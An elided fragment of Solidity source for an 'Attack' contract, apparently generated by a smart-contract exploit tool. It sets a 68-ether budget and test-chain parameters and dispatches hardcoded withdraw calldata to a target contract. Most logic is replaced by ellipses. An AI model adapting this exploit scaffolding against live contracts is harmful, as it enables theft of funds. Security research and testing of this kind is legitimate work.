 ...
 * parameter. Make sure to send at least 68 ether and 0 wei to the attack
 ...
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x3afb087b876900000 wei
 *
 */
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 4) {
                ...
                input: { uint(6999999999999999999),  }
 
                 */
                bytes memory data = bytes(hex"2e1a7d4d0000000000000000000000000000000000000000000000006124fee993bbffff");
                uint value = 0x0;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x3afb087b876900000; /* equals 68 ether and 0 wei */
    uint constant INITIAL_ETHER = 0x3afb087b876900000;
